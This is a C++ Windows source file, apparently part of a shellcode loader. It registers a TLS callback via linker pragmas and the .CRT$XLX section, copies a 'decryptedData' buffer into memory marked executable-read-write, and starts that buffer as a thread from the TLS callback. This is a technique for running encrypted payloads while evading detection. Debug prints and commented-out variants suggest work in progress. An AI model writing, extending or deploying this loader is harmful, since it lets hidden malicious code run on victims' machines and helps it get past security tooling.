//
// Created by au9u5t on 24-10-8.
//
#include "TLSLoad.h"

LPVOID TLSCallbackLoadMemory{nullptr};
bool isTLSCallbackLoadMemory{false};

#ifdef _WIN64
#pragma comment(linker, "/INCLUDE:_tls_used")
#else
#pragma comment(linker,"/INCLUDE:__tls_used")
#endif // _WIN64


#ifdef _WIN64
#pragma comment(linker, "/INCLUDE:_tls_used")
#else
#pragma comment(linker,"/INCLUDE:__tls_used")
#endif // _WIN64


VOID NTAPI TLSCallbackLoadTlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved) {
//    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), "22222222!\n", 10, nullptr, nullptr);
    if (dwReason == DLL_THREAD_DETACH ) {
        if (TLSCallbackLoadMemory != nullptr && !isTLSCallbackLoadMemory) {
            isTLSCallbackLoadMemory = true;
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), "222\n", 4, nullptr, nullptr);
            CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)TLSCallbackLoadMemory, nullptr, 0, nullptr);
//            ((void (*)()) TLSCallbackLoadMemory)();
//            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), "33333333!\n", 4, nullptr, nullptr);
        }
    }
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), "333\n", 4, nullptr, nullptr);
//    ((void (*)()) TLSCallbackLoadMemory)();
}


extern "C"
#ifdef _WIN64
#pragma const_seg(".CRT$XLX")
const
#else
#pragma data_seg(".CRT$XLX")
#endif

PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = {TLSCallbackLoadTlsCallBack, 0};
#pragma data_seg()

namespace lib {
    void print_hello() {
        cout << "Hello World!" << endl;
    }


    void function1(const unsigned char *decryptedData, const size_t &byteLength) {
//        LPVOID t = VirtualAlloc(NULL, byteLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        TLSCallbackLoadMemory = VirtualAlloc(NULL, byteLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (TLSCallbackLoadMemory == nullptr) {
            cout << "VirtualAlloc failed!" << endl;
            return;
        }
        memcpy(TLSCallbackLoadMemory, decryptedData, byteLength);
//        memcpy(t, decryptedData, byteLength);

//        ((void (*)()) t)();
//        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) print_hello, nullptr, 0, nullptr);
//        cout << "sss" << endl;
//        ((void (*)()) TLSCallbackLoadMemory)();
//        if (TLSCallbackLoadMemory != nullptr) {
//            cout << "TLSCallbackLoadMemory" << endl;
//            ((void (*)()) TLSCallbackLoadMemory)();
//        }
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) print_hello, nullptr, 0, nullptr);
//        Sleep(10000);
//        cout << "111111111!" << endl;

    }

}